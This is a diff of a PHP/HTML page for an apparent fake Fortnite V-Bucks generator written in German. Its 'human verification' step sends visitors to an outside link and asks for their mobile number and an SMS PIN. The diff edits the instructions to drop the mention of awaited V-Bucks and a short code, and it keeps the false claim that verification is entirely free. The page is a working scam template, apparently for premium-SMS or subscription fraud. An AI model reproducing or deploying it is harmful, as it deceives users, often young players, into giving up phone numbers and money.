@@ -39,16 +39,16 @@ define('IS_AJAX', isset($_SERVER['HTTP_X_REQUESTED_WITH']) &&      strtolower($_
 <div class="human-verification-wrapper">
 	<h3>MENSCHLICHE VERIFIZIERUNG ERFORDERLICH</h3>
     <br>
-    <p>Um zu verhindern, dass unser Generator vom Roboter missbraucht wird, müssen Sie sicherstellen, dass Sie ein Mensch sind, indem Sie Ihre Handynummer verwenden.</p>
+    <p>Um zu verhindern, dass unser Generator von Robotern missbraucht wird, müssen Sie sicherstellen, dass Sie ein Mensch sind, indem Sie Ihre Handynummer verwenden.</p>
     <br>
     <p>1. Klicken Sie unten auf die Schaltfläche "Verifizieren".</p>
     <a href="https://reursary-cershine.com/7cd5c973-c0db-4039-86bf-4d780a1c6277"><button class="fortnite-button click-sound"><span>Verifizieren</span></button></a>
     <br>
-    <p>2. Geben Sie Ihre Telefonnummer und die erhaltene PIN ein.</p>
+    <p>2. Geben Sie Ihre Handynummer und die erhaltene PIN ein.</p>
     <br>
-    <p>3. Warten Sie bis zu 30 Minuten, bis Sie Ihre v-bucks erhalten haben und schreiben Sie dann "STOP" an die Nummer, von der Sie die PIN erhalten haben.</p>
+    <p>3. Schreiben Sie "ENDE" an die Nummer, von der Sie die TAN erhalten haben.</p>
     <br>
-    <p>WICHTIG: DIE VERIFIZIERUNG IST ZU 100% KOSTENLOS, WENN SIE AN DIESE NUMMER 67881 "STOP" SCHREIBEN. SCHREIBEN SIE KEINEN TEXT "STOP", BIS SIE IHRE V-BUCKS ERHALTEN.</p>
+    <p>WICHTIG: DIE VERIFIZIERUNG IST ZU 100% KOSTENLOS.</p>
      <br>
 	<div class="verification-loader-wrapper">
 		<div class="spinner">
